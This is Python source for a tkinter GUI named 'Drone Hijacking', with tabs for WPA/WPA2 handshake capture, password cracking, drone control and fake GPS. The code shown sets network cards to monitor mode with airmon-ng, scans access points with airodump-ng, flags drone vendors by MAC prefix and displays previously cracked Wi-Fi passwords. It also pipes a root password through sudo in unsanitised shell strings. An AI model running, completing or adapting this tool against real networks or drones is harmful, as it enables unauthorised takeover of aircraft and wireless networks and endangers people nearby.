from tkinter import *
from tkinter import Tk, ttk, messagebox, Label, Text
from tkinter.ttk import Notebook, Treeview
import threading,os, time, subprocess,csv
import socket,smtplib,getpass, datetime
import signal, string,sys,requests,re
import json

###########################

cmd = "grep rootPassword SystemInformation.txt |awk '{print $2}'"
SysPasswd = str(os.popen(cmd).readlines())[2:-4]

SuPasswd=SysPasswd
def getRootPassword():
    a = input("Input root password:(default : q)")
    if len(a)>0:
        SuPasswd = a
        

def RunConfig():
    os.system('echo '+SuPasswd+' |sudo -S chmod 777 CrackPasswdTools/*.sh')
    os.system('chmod 777 ./gpsTools/gps-sdr-sim')
    os.system('echo '+SuPasswd+' |sudo -S rm *.cap') #1
    os.system('echo '+SuPasswd+' |sudo -S rm *.netxml') #2
    os.system('echo '+SuPasswd+' |sudo -S rm getStat*.csv') # Delete the csv File so as to get station

    os.system('echo '+SuPasswd+' |sudo -S chmod 777 usbResetTools/usbreset')#reset usb connect tools
    os.system('clear')

threading.Thread(target=RunConfig).start()
############################
root = Tk()
root.geometry("1100x593")
#xdotool search "Drone Hijacking" windowsize 1100 593
root.wm_attributes('-type', 'splash')
root.title("Drone Hijacking")

heig=root.winfo_height()
widt=root.winfo_width()

title_bar = Frame(root,bg='black' ,relief='raised', width=75, height=25)
title_bar.pack(fill=X, side = TOP)
title_bar.config(cursor='fleur')

##don't delete 
password=""

def callback():
    res = messagebox.askokcancel("Really want to exit?","Exit or cancel?")
    if res == True:
        root.destroy()
        os.system('clear')
        print()
        print('Content cleared!' + '\n')
        print('Program exit safely! Have a nice day!' + '\n')
        print("Today Date:" , datetime.date.today())
        print("Current Time:" , datetime.datetime.now().time())
        print()
    else:
        return
root.protocol("WM_DELETE_WINDOW",callback)

exitBt= Button(title_bar,text="●",
               relief='flat',
               bg='black',
               bd=0,
               fg='#EA4B4B',
               activeforeground='#B43B3B',
               activebackground='black',
               highlightthickness = 0,
               command=callback)
exitBt.config(highlightbackground="#545454")
exitBt.config(cursor='arrow')
exitBt.pack(side = RIGHT)
setTitle="  "+root.title()
TitleText= Label(title_bar,text=setTitle,bg='black',fg='#CFCFCF')
TitleText.pack(side = LEFT)


def get_pos(event):
	xwin = root.winfo_x()
	ywin = root.winfo_y()
	startx = event.x_root
	starty = event.y_root
	ywin = ywin - starty
	xwin = xwin - startx

	def move_window(event):
		heig=root.winfo_height()
		widt=root.winfo_width()
		windowsSize=str(widt)+"x"+str(heig)
		root.geometry(windowsSize + '+{0}+{1}'.format(event.x_root + xwin, event.y_root + ywin))
		startx = event.x_root
		starty = event.y_root

	TitleText.bind('<B1-Motion>', move_window)
	title_bar.bind('<B1-Motion>', move_window)
TitleText.bind('<Button-1>', get_pos)
title_bar.bind('<Button-1>', get_pos)

title_bar_Left = Frame(root,bg='black' ,relief='raised', width=230)
title_bar_Left.pack(fill=Y,side = LEFT)

#######################
### Tab control bar ###
#######################

Middle_Data = Frame(root,bg='#2A2A2A' ,relief='raised', width=950)
Middle_Data.pack(fill=Y,side = LEFT)

note = Notebook(Middle_Data)
note.place(x=-2,y=-25)

##########################
## GUI NoteBook Widget ###
##########################

tab1  = Frame(note,bg="black",width=950,height=600)
tab2  = Frame(note,bg="black",width=950,height=600)
tab3  = Frame(note,bg="black",width=950,height=600)
tab4  = Frame(note,bg="black",width=950,height=600)
tab5  = Frame(note,bg="black",width=950,height=600)

tab6  = Frame(note,bg="black",width=950,height=600)
tab7  = Frame(note,bg="black",width=950,height=600)
tab8  = Frame(note,bg="black",width=950,height=600)
tab9  = Frame(note,bg="black",width=950,height=600)
tab10 = Frame(note,bg="black",width=950,height=600)

note.add(tab1 , text = "Network Card")
note.add(tab2 , text = "Detect the Access Point")
note.add(tab3 , text = "Station Checking")  
note.add(tab4 , text = "Handshake (WPA/WPA2)")
note.add(tab5 , text = "Crack Password (WPA/WPA2)")

note.add(tab6 , text = "Wifi Connect")
note.add(tab7 , text = "Drone Control")
note.add(tab8 , text = "HackRf One Select")  
note.add(tab9 , text = "Fake GPS")
note.add(tab10, text = "About Drone Hijacking")

#################
### Root Bind ###
#################

def endtheprogram(event):
    root.destroy()
    os.system('clear')
    print()
    print('Content cleared!' + '\n')
    print('Program exit safely! Have a nice day!' + '\n')
    print("Today Date:" , datetime.date.today())
    print("Current Time:" , datetime.datetime.now().time())
    print()

def shut(event):
    os.system("shutdown now")

def restart(event):
    os.system("reboot")
	
root.bind("<F1>", endtheprogram)
root.bind("<F5>", shut)
root.bind("<F6>", restart)

################################
###  Tab1 Check network card ###
################################
#########################
### Tab1 Introduction ###
#########################

tab1string = "Crack the network card and choose the function"
tab1_intro= Label(tab1,text=tab1string,background="black",foreground="yellow",
                  font=("Helvetica", 16, "bold"))
tab1_intro.place(x=42,y=10)

###################################
### Tab1 TreeView Configuration ###
###################################
networkCard = Treeview(tab1,columns=("PHY","Interface","Driver","Chipset","Function"), height = 12)
networkCard.heading("#0",text="PHY")
networkCard.heading("#1",text="Interface")
networkCard.heading("#2",text="Driver")
networkCard.heading("#3",text="Chipset")
networkCard.heading("#4",text="Status")
networkCard.heading("#5",text="Function")

networkCard.column("#0",anchor=CENTER,width=60)
networkCard.column("#1",anchor=CENTER,width=100)
networkCard.column("#2",anchor=CENTER,width=100)
networkCard.column("#3",anchor=CENTER,width=380)
networkCard.column("#4",anchor=CENTER,width=100)
networkCard.column("#5",anchor=CENTER,width=100)
networkCard.place(x=10, y=50)
##########################
### variable of atanna ###
##########################

DelinkAT=''
ConnectAT=''

##########################################################################################################################################
###                                                           Tab control bar                                                          ###                               
##########################################################################################################################################

GreenNormal="#F4FF00"
GreenClick="#9B9E00"
RedNormal='#919191'
RedClick='#818181'
disableColor="#797979"


def goTab1():
    note.select(tab1)
def goTab2():
    note.select(tab2)
def goTab3():
    note.select(tab3)
def goTab4():
    note.select(tab4)
def goTab5():
    note.select(tab5)

def goTab6():
    note.select(tab6)
def goTab7():
    note.select(tab7)
def goTab8():
    note.select(tab8)
def goTab9():
    note.select(tab9)
def goTab10():
    note.select(tab10)


def ColorRedAll():
    tab1bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab2bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab3bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab4bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab5bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)

    tab6bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab7bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab8bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab9bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)
    tab10bt.config(highlightbackground="#545454",fg=RedNormal,activeforeground=RedClick)

def routine(event):
    ColorRedAll()
    print('Frame in '+str(1 + note.index(note.select())))

    if note.index(note.select())==0:
        tab1bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==1:
        tab2bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==2:
        tab3bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==3:
        tab4bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==4:
        tab5bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)

    elif note.index(note.select())==5:
        tab6bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==6:
        tab7bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==7:
        tab8bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==8:
        tab9bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    elif note.index(note.select())==9:
        tab10bt.config(highlightbackground="#545454",fg=GreenNormal,activeforeground=GreenClick)
    else:
        pass

  
note.bind("<<NotebookTabChanged>>",routine)

data = note.tab(0)["text"]

tab1bt= Button(title_bar_Left,text=('●  '+str(note.tab(0)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab1)
tab1bt.config(highlightbackground='#545454')
tab1bt.place(x=10,y=10)

tab2bt= Button(title_bar_Left,text=('●  '+str(note.tab(1)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab2)
tab2bt.config(highlightbackground='#545454')
tab2bt.place(x=10,y=50)

tab3bt= Button(title_bar_Left,text=('●  '+str(note.tab(2)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab3)
tab3bt.config(highlightbackground='#545454')
tab3bt.place(x=10,y=90)

tab4bt= Button(title_bar_Left,text=('●  '+str(note.tab(3)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab4)
tab4bt.config(highlightbackground='#545454')
tab4bt.place(x=10,y=130)

tab5bt= Button(title_bar_Left,text=('●  '+str(note.tab(4)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab5)
tab5bt.config(highlightbackground='#545454')
tab5bt.place(x=10,y=170)


tab6bt= Button(title_bar_Left,text=('●  '+str(note.tab(5)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab6)
tab6bt.config(highlightbackground='#545454')
tab6bt.place(x=10,y=210)

tab7bt= Button(title_bar_Left,text=('●  '+str(note.tab(6)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab7)
tab7bt.config(highlightbackground='#545454')
tab7bt.place(x=10,y=250)

tab8bt= Button(title_bar_Left,text=('●  '+str(note.tab(7)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab8)
tab8bt.config(highlightbackground='#545454')
tab8bt.place(x=10,y=290)

tab9bt= Button(title_bar_Left,text=('●  '+str(note.tab(8)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab9)
tab9bt.config(highlightbackground='#545454')
tab9bt.place(x=10,y=330)

tab10bt= Button(title_bar_Left,text=('●  '+str(note.tab(9)['text'])),relief='raised',bg='black',bd=0,activebackground='black',highlightthickness = 0, command=goTab10)
tab10bt.config(highlightbackground='#545454')
tab10bt.place(x=10,y=370)

########################
### Function of Tab1 ###
########################

def getUpdateDataForNetworkCard():

    tab1string = '                                                                                                                                                                   '
    ##############################################
    ### Tab1 Function Delete all TreeView Item ###
    ##############################################

    for i in networkCard.get_children():
        networkCard.delete(i)

    ##################################################################################
    ### Tab1 Function Using airmon-ng to get all list messages and update Treeview ###
    ##################################################################################
    getNetwarkCard = subprocess.Popen('echo '+ SuPasswd +' |sudo -S airmon-ng', shell = True, stdout=subprocess.PIPE).stdout.readlines()
    for x in range(2,len(getNetwarkCard)):

        if(len(getNetwarkCard[x]) > 1):
            saveValue = str(getNetwarkCard[x])
            data = saveValue.split('\\t')

            try:
                networkCardvlaue = [data[1],data[3],data[4][:-3],"Enabled ✔",""]
            except:
                networkCardvlaue = [data[1],data[2],data[3][:-3],"Enabled ✔",""]
            networkCard.insert("",index=END,text=data[0][2:],values=networkCardvlaue,tags = ('odd'))

            
            networkCard.tag_configure('odd', foreground='yellow')
    
    ###################################################        
    ### Tab1 Function : If there is no network card ###
    ###################################################

    if (len(networkCard.get_children())==0):
        messagebox.showwarning("Network Card","Warning, Please ensure having at leaset one network card.")

#getUpdateDataForNetworkCard()

ab = PhotoImage(file="Graphic/Refresh.png")

tab1Run = Button(tab1, text = "Refresh",image=ab,command=getUpdateDataForNetworkCard,
                 background = "black",foreground="yellow",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="left")
tab1Run.place(x=10,y=510)
################################
### Tab1 interface mode      ###
################################
def getInterfaceMode(interf):
    process = subprocess.Popen(["iwconfig", interf], stdout=subprocess.PIPE)
    save = str(process.communicate()[0])
    if save.find('Managed')>0:
        return 'Managed'
    elif save.find('Monitor')>0:
        return 'Monitor'
    else:
        return('null')

############################
### Tab1 update function ###
############################
def OpenMon(interface):
    cmd = 'echo '+ SuPasswd +' |sudo -S airmon-ng start '+interface
    if interface[-3:]!="mon":
        try:
            getres= subprocess.Popen(cmd, shell = True, stdout=subprocess.PIPE).stdout.readlines()
            result = str(getres[14].decode('utf-8')).split()[1]
        except:
            pass
    else:
        result = interface
    return result
        
def StopMon(interface):
    cmd = 'echo '+ SuPasswd +' |sudo -S airmon-ng stop '+interface
    if interface[-3:]=="mon":
        try:
            getres= subprocess.Popen(cmd, shell = True, stdout=subprocess.PIPE).stdout.readlines()
            result = str(getres[3].decode('utf-8')).split()[1]
        except:
            pass
    else:
        result = interface        
    return result

    
def selectItemFunction(Name1,Name2):
    selectItem = networkCard.focus()
  
    if len(selectItem)!=0:
        networkCardChoosedVlaue = [str(networkCard.item(selectItem)['values'][0]),str(networkCard.item(selectItem)['values'][1]),
                                str(networkCard.item(selectItem)['values'][2]),str(networkCard.item(selectItem)['values'][3]),Name1]

        PhyValue=str(networkCard.item(selectItem)['text'])
        count = 0
        for i in networkCard.get_children():
            count=count+1      
            if i ==selectItem:
                networkCard.delete(selectItem)
                networkCard.insert("",index=count,text=PhyValue,values=networkCardChoosedVlaue,tags = ('odd'))
            else:

                if str(networkCard.item(i)['values'][4]) == Name2 :
                    networkCardvlaue = [str(networkCard.item(i)['values'][0]),str(networkCard.item(i)['values'][1]),str(networkCard.item(i)['values'][2]),str(networkCard.item(i)['values'][3]),Name2]
                else:
                    networkCardvlaue = [str(networkCard.item(i)['values'][0]),str(networkCard.item(i)['values'][1]),str(networkCard.item(i)['values'][2]),str(networkCard.item(i)['values'][3]),'']
                    
                networkCard.insert("",index=count,text=str(networkCard.item(i)['text']),values=networkCardvlaue,tags = ('odd'))
                networkCard.delete(i)

def selectItemNetworkCardConnect(event):
    selectItemFunction('Connect','Delink')

def selectItemNetworkCardDelink(event):
    selectItemFunction('Delink','Connect')

######################
### Tab1 Get Value ###
######################
    
def getDelink():
    for i in networkCard.get_children():
        try:
            if str(networkCard.item(i)['values'][4]) == 'Delink':
                res = str(networkCard.item(i)['values'][0])
                break
        except:
            pass
    return res
    
def getConnect():
    for i in networkCard.get_children():
        try:
            if str(networkCard.item(i)['values'][4]) == 'Connect':
                res = str(networkCard.item(i)['values'][0])
                break
        except:
            pass
    return res
  
#####################
### Tab1 continue ###
#####################

def checkFunction():    
    try:
        len(getDelink())
        len(getConnect())
        res = messagebox.askokcancel("Question","Are you sure ?")
        if res == True:
            runchange()
            note.select(tab2)
        else:
            pass
    except:
        messagebox.showwarning("Warning","Please the functions of the network card")

def runchange():
    tab1Continue.config(state="disabled")
    try:
        if getInterfaceMode(str(getDelink()))!='Monitor':
            os.system('echo '+ SuPasswd +' |sudo -S airmon-ng start ' + getDelink())
    except:
        pass
    try:
        if getInterfaceMode(str(getConnect()))!='Managed':
            os.system('echo '+ SuPasswd +' |sudo -S airmon-ng stop ' + getConnect())
    except:
        pass

    DelinkPhy=''
     
    for i in networkCard.get_children():
        networkcardmode = str(networkCard.item(i)['values'][4])
        
        if networkcardmode == 'Delink':
            DelinkPhy = str(networkCard.item(i)['text'])
        elif networkcardmode == 'Connect':
            ConnectPhy = str(networkCard.item(i)['text'])

    ##############################################
    ### Tab1 Function Delete all TreeView Item ###
    ##############################################

    for i in networkCard.get_children():
        networkCard.delete(i)

    ##################################################################################
    ### Tab1 Function Using airmon-ng to get all list messages and update Treeview ###
    ##################################################################################
    getNetwarkCard = subprocess.Popen('echo '+ SuPasswd +' |sudo -S airmon-ng', shell = True, stdout=subprocess.PIPE).stdout.readlines()

    for x in range(2,len(getNetwarkCard)):

        if(len(getNetwarkCard[x]) > 1):
            saveValue = str(getNetwarkCard[x])
            data = saveValue.split('\\t')
                
            PhyVal = str(data[0][2:])
            if PhyVal == DelinkPhy:
                try:
                    networkCardvlaue = [data[1],data[3],data[4][:-3],"Enabled ✔","Delink"]
                except:
                    networkCardvlaue = [data[1],data[2],data[3][:-3],"Enabled ✔","Delink"]
            elif PhyVal == ConnectPhy:
                try:
                    networkCardvlaue = [data[1],data[3],data[4][:-3],"Enabled ✔","Connect"]
                except:
                    networkCardvlaue = [data[1],data[2],data[3][:-3],"Enabled ✔","Connect"]
            else:
                try:
                    networkCardvlaue = [data[1],data[3],data[4][:-3],"Enabled ✔",""]
                except:
                    networkCardvlaue = [data[1],data[2],data[3][:-3],"Enabled ✔",""]
                
            networkCard.insert("",index=END,text=PhyVal,values=networkCardvlaue,tags = ('odd'))            
            networkCard.tag_configure('odd', foreground='yellow')

    tab1Continue.config(state="normal")

########################
### Tab1 Mode Change ###
########################

EmojiOK = PhotoImage(file="Graphic/emojiOK.png")

tab1Continue = Button(tab1, text = "ok",image=EmojiOK,command=checkFunction,
                 background = "black",foreground="yellow",highlightbackground='black',
                 font = ("Helvetica", 16, "bold"),relief="raised",compound="right")
tab1Continue.place(x=170,y=510)

##########################
### Tab1 TreeView Bind ###
##########################
            
networkCard.bind('<Button-1>',selectItemNetworkCardDelink)
networkCard.bind('<Double-Button-3>',selectItemNetworkCardConnect)

def printdata(event):
    
    networkCard.focus(networkCard.identify_row(event.y))
    networkCard.selection_set(networkCard.identify_row(event.y))

networkCard.bind('<Button-3>',printdata)

##################################################
### Tab1 Description of program short-cut key ####
##################################################

tab1string = "Double Left Click → Delink\n    Double Right Click → Connect"
tab1_intro= Label(tab1,text=tab1string,background="black",foreground="yellow",
                  font=("Helvetica", 16, "bold"))
tab1_intro.place(x=25,y=440)

####################
### Tab1 Graphic ###
####################

checkIcon = PhotoImage(file = "Graphic/tab1Check.png")
checkIconSet = Label(tab1, image = checkIcon,bg="black")
checkIconSet.place(x=10, y=6, width=35, height=35)

DoubleClick = PhotoImage(file = "Graphic/tab1DoubleClick.png")
DoubleClickSet = Label(tab1, image =DoubleClick,bg="black")
DoubleClickSet.place(x=10, y=450, width=35, height=35)

drone_gra = PhotoImage(file = "Graphic/Drone.png")
tab1_gra = Label(tab1, image = drone_gra)
tab1_gra.place(x=440, y=340, width=398, height=199)

################################
### Tab2 Detect Access Point ###
################################

#########################
### Tab2 Introduction ###
#########################
  
tab2Intro = "Detect the Access Point"
tab2_intro_lab = Label(tab2,text = tab2Intro, background="black",foreground="yellow",
                       font=("Helvetica", 16, "bold"))
tab2_intro_lab.place(x=48,y=10)

tab2_lab2 = Label(tab2,text=" Double Left Click Item → Station Checking ",background="black",
                  foreground="yellow", font=("Helvetica", 16, "bold"))
tab2_lab2.place(x=47,y=470)

tab2_lab2_Red = Label(tab2,text=" Red color is cracked before",background="black",
                  foreground="#F54646", font=("Helvetica", 16, "bold"))
tab2_lab2_Red.place(x=40,y=410)

tab2_lab3 = Label(tab2,text=" Loading...After 10 seconds, you will be directed to Tab3",background="black",
                  foreground="red", font=("Helvetica", 16, "bold"))
tab2_lab3.place(x=47,y=500)
tab2_lab3.place_forget()

############################
### Tab2 Drone Filtering ###
############################
DroneDict = {}
of = open("DroneDataList.csv", "rb")
while 1 :
    # read line
    line = of.readline()
    res = str(line)[2:-3].split(',')
    try:
        DroneDict[str(res[2])]=str(res[0]+' '+res[1])
    except:
        pass
    if not line:
        break
of.close()

def Checkdrone(macAddress):
    macAddress=macAddress.replace(":", '')[0:6]
    try:
        return DroneDict[macAddress]
    except:
        return 'No record'


OUIDict = {}
fh = open("oui.txt", "rb")
while 1 :
    # read line
    line = fh.readline()
    var = str(line).split('     (base 16)\\t\\t')
    try:
        OUIDict[var[0][2:]] = var[1][:-5]
    except:
        pass
    # check if line is not empty
    if not line:
        break
fh.close()

def OtherDeviceName(macAddress):
    macAddress=macAddress.replace(":", '')[0:6]
    try:
        return OUIDict[macAddress]
    except:
        return 'No recoed'

def CrackedPasswordReq(macAddress):
    if len(macAddress)==17:
        try:
            cmd="grep '"+macAddress+"' PasswordRecord.txt |tail -1"
            p = str(subprocess.Popen(cmd,shell = True,stdout = subprocess.PIPE, stderr = subprocess.STDOUT).communicate()[0])
            return(str(p).split('|')[2][:-3])
            
        except:
            return 'n'
    else:
        return 'n'



###################################################
### Tab2 Multi-Thread (Search the Access Point) ###
###################################################

class tab2_main:
    def newThread(self):
        threading.Thread(target=self.airodump).start()
        threading.Thread(target=self.tab2_pbStop).start()

    def tab2_pbStop(self):
        tab2_Run_Button.config(foreground="Red")
        tab2_del.configure(state=DISABLED)
        
        tab2_Run_Button.config(text="Click to stop Process")

        #define the style of the treeview
        Treeview_TabTwo.tag_configure('droneCracked', foreground='#F54646',background='black')
        Treeview_TabTwo.tag_configure('droneTop', foreground='yellow',background='black')
        Treeview_TabTwo.tag_configure('drone', foreground='yellow',background='black')
        Treeview_TabTwo.tag_configure('otherTop', foreground='lightblue',background='black')
        Treeview_TabTwo.tag_configure('other', foreground='lightblue',background='black')


        subprocess.call('echo '+SuPasswd+' |sudo -S rm myOutput*.csv',shell=True)
        cmd = "echo "+SuPasswd+" |sudo -S airodump-ng -w myOutput --output-format csv " + getDelink()
        print('Command of Search Access Point: ' + cmd)

        os.system(cmd)

        tab2_pbAirDump.stop()
        tab2_Run_Button.config(text="  Halting the Process")


        tab2_del.configure(state=NORMAL)

    def airodump_Update(self):

        DroneList = 0
        DroneListCracked=[]
        DroneListNonCracked=[]

        notDroneList = 0
        notDroneListCracked=[]
        notDroneListtNonCracked=[]

        for x in os.popen("""awk -F ',' 'length($14)>0{print $1","$4","$6","$8","$14}' myOutput-01.csv |tail -n +2""").readlines():
            value = x[:-1].split(',')
            if Checkdrone(value[0]) != 'No record':
                DroneList = DroneList + 1
                if CrackedPasswordReq(value[0]) == 'n':
                    DroneListNonCracked.append(x)
                else:
                    DroneListCracked.append(x)
            else:
                notDroneList = notDroneList + 1
                if CrackedPasswordReq(value[0]) == 'n':
                    notDroneListtNonCracked.append(x)
                else:
                    notDroneListCracked.append(x)


        for i in Treeview_TabTwo.get_children(): ## Delete all TreeView Data
            Treeview_TabTwo.delete(i)
    
        if DroneList>0:#drone title
            Treeview_TabTwo.insert("",index=END,text='Drone:',values=['','','','',''],tags = ('droneTop'))

            for x in DroneListCracked:#Drone Cracked
                value = x[:-1].split(',')
                listDATA=[value[4],value[1],value[2],value[3],OtherDeviceName(value[0])]
                Treeview_TabTwo.insert("",index=END,text=value[0],values=listDATA,tags = ('droneCracked'))

            for x in DroneListNonCracked:
                value = x[:-1].split(',')#Drone non Cracked
                listDATA=[value[4],value[1],value[2],value[3],OtherDeviceName(value[0])]
                Treeview_TabTwo.insert("",index=END,text=value[0],values=listDATA,tags = ('droneTop'))

            Treeview_TabTwo.insert("",index=END,text='Other Devices:',values=['','','','',''],tags = ('other'))

        for x in notDroneListCracked:
            value = x[:-1].split(',')#not Drone Cracked
            listDATA=[value[4],value[1],value[2],value[3],OtherDeviceName(value[0])]
            Treeview_TabTwo.insert("",index=END,text=value[0],values=listDATA,tags = ('droneCracked'))

        for x in notDroneListtNonCracked:
            value = x[:-1].split(',')#not Drone non Cracked
            listDATA=[value[4],value[1],value[2],value[3],OtherDeviceName(value[0])]
            Treeview_TabTwo.insert("",index=END,text=value[0],values=listDATA,tags = ('other'))


    def airodump(self):
        while 1==1:
            tab2_pbAirDump.start(120)
            for x in range(10):
                if str(tab2_Run_Button.config()).find('Halting the Process') > 0 :
                    break
                else:
                    time.sleep(1)
            
            if str(tab2_Run_Button.config()).find('Halting the Process') > 0 :
                break

            threading.Thread(target=self.airodump_Update).start()
            tab2_pbAirDump.stop()
        tab2_Run_Button.config(foreground="yellow")
        tab2_Run_Button.config(text="Search Access Point")


tab2_pbAirDump = ttk.Progressbar(tab2, orient="horizontal", length=1000, mode="determinate")
tab2_pb = ttk.Progressbar(tab2, orient="horizontal", length=1000, mode="determinate")
tab2_pb.place(x=0,y=553)

tab2op = tab2_main()

def tab2Run():
    if str(tab2_Run_Button.config()).find('yellow')>0:
        tab2_pbAirDump.place(x=0,y=553)
        tab2_pb.place_forget()

        print('test')
        try:
            str(getDelink())
            tab2op.newThread()
        except:
            print('no network card')
            note.select(tab1)
            messagebox.showwarning("Warning","Please the functions of the network card")
    else:
        os.system('echo '+ SuPasswd +' |sudo -S pkill airodump-ng')
        tab2_pbAirDump.place_forget()
        tab2_pb.place(x=0,y=553)
        tab2_pbAirDump.stop()

##########################################################
### Tab2 Treeview style && Configuration and scrollbar ###
##########################################################

Treeview_TabTwo = Treeview(tab2,columns=("ESSID","Channel","Privacy","Encryption","Drone Vendor"), 
                           height = 16)
vsb = ttk.Scrollbar(tab2, orient="vertical", command=Treeview_TabTwo.yview)
vsb.place(x=840, y=66, height=321)
Treeview_TabTwo.configure(yscrollcommand=vsb.set)

Treeview_TabTwo.heading("#0",text="BSSID")
Treeview_TabTwo.heading("#1",text="ESSID")
Treeview_TabTwo.heading("#2",text="Channel")
Treeview_TabTwo.heading("#3",text="Encryption")
Treeview_TabTwo.heading("#4",text="Authentication")
Treeview_TabTwo.heading("#5",text="Device Provider")

style = ttk.Style()
ttk.Style().theme_use('default')
style.configure(".", fg="red")
ttk.Style().configure("Treeview.Heading",background = "black",foreground="yellow")		  
ttk.Style().configure("Treeview", background="black",foreground='yellow', fieldbackground="black") 

Treeview_TabTwo.column("#0",anchor=CENTER,width=159)
Treeview_TabTwo.column("#1",anchor=CENTER,width=159)
Treeview_TabTwo.column("#2",anchor=CENTER,width=80)
Treeview_TabTwo.column("#3",anchor=CENTER,width=110)
Treeview_TabTwo.column("#4",anchor=CENTER,width=120)
Treeview_TabTwo.column("#5",anchor=CENTER,width=200)
Treeview_TabTwo.pack(side = 'left',fill = 'y')
Treeview_TabTwo.tag_configure('odd', background='orange')
Treeview_TabTwo.place(x=10,y=50)

def tree_print(event):
    try:
        curItem = Treeview_TabTwo.focus()
        if len(Treeview_TabTwo.item(curItem)['values'][3])>0:
            tree_print_do()
    except:
        pass

def tree_print_do():

    save = len(os.popen("ps a| grep 'airodump-ng -w myOutput --output-format csv wlan0mon'").readlines())
    if save > 4 :
        os.system('echo '+ SuPasswd +' |sudo -S pkill airodump-ng')
        tab2_pbAirDump.place_forget()
        tab2_pb.place(x=0,y=553)


    tab2_lab3.place(x=47,y=500)
    curItem = Treeview_TabTwo.focus()
    if len(Treeview_TabTwo.item(curItem)['text']) > 16 :
        BSSID   = str(Treeview_TabTwo.item(curItem)['text'])
        CHANNEL = str(Treeview_TabTwo.item(curItem)['values'][0])
        PRIVACY = str(Treeview_TabTwo.item(curItem)['values'][1])
        AUTH    = str(Treeview_TabTwo.item(curItem)['values'][2])
        ESSID   = str(Treeview_TabTwo.item(curItem)['values'][3])
        
        tab2Run2()
        RowOfAP = '  ' + BSSID + '   ' + ESSID + '   ' + CHANNEL + '   ' + PRIVACY + '   ' + AUTH
        tab2_lab2 .configure(text = " Monitoring : " + RowOfAP)
        return BSSID, CHANNEL, ESSID

def BSSID():
    curItem = Treeview_TabTwo.focus()
    return str(Treeview_TabTwo.item(curItem)['text'])

def CHANNEL():
    curItem = Treeview_TabTwo.focus()
    return str(Treeview_TabTwo.item(curItem)['values'][1])

def PRIVACY():
    curItem = Treeview_TabTwo.focus()
    return str(Treeview_TabTwo.item(curItem)['values'][2]).strip()

def AUTH():
    curItem = Treeview_TabTwo.focus()
    return str(Treeview_TabTwo.item(curItem)['values'][3])

def ESSID():
    curItem = Treeview_TabTwo.focus()
    return str(Treeview_TabTwo.item(curItem)['values'][0])
            
Treeview_TabTwo.bind('<Double-Button-1>',tree_print)


popup = Menu(Treeview_TabTwo, tearoff=0,bg='#000000',fg='yellow',activebackground='#000000',activeforeground='yellow')
popup.add_command(label="Next")
popup.add_command(label="Previous")
popup.add_separator()
popup.add_command(label="Home")
popup.delete(0,100)


def do_popup(event):
    try:
        Treeview_TabTwo.focus(Treeview_TabTwo.identify_row(event.y))
        selectItem = Treeview_TabTwo.identify_row(event.y)
        PhyValue=Treeview_TabTwo.item(selectItem)
        if len(str(PhyValue['values'][4]))>0:

            try:
                popup.delete(0,100)
                popup.add_command(label='Details Data:')
                popup.add_separator()
                popup.add_command(label='BSSID: '+ str(PhyValue['text']))
                popup.add_command(label='ESSID: '+ str(PhyValue['values'][0]))
                popup.add_command(label='Channel: '+ str(PhyValue['values'][1]))
                popup.add_command(label='Enceyption: ' + str(PhyValue['values'][2]))
                popup.add_command(label='Authentication: ' + str(PhyValue['values'][3]))
                popup.add_command(label='Device Provider: ' + str(PhyValue['values'][4]))
                ResCrackPswd = CrackedPasswordReq(PhyValue['text'])
                if ResCrackPswd != 'n':
                    popup.add_command(label='Cracked Password: ' + str(ResCrackPswd))
                popup.add_separator()
                popup.add_command(label='Click any items to close menu')
                popup.tk_popup(int(event.x_root)-20,event.y_root, 0)

            finally:
                popup.grab_release()
    except:
        pass


Treeview_TabTwo.bind("<Button-3>", do_popup)
#testing
####################
### Tab2 Graphic ###
####################

Detect = PhotoImage(file = "Graphic/tab1Detect.png")
DetectSet = Label(tab2, image = Detect,bg="black")
DetectSet.place(x=10, y=10, width=35, height=25)

AccessPoint = PhotoImage(file = "Graphic/tab2AccessPoint.png")
AccessPointSet = Label(tab2, image = AccessPoint,bg="black")
AccessPointSet.place(x=10, y=465, width=35, height=35)

#######################
### Tab2 Run button ###
#######################

searchIcon = PhotoImage(file="Graphic/search.png")

tab2_Run_Button = Button(tab2,text="Search Access Point",image=searchIcon,command=tab2Run,
                         background="black",foreground="yellow",highlightbackground='black',
                         font=("Helvetica", 16, "bold"),relief="raised",compound="left")
tab2_Run_Button.place(x=550,y=410)


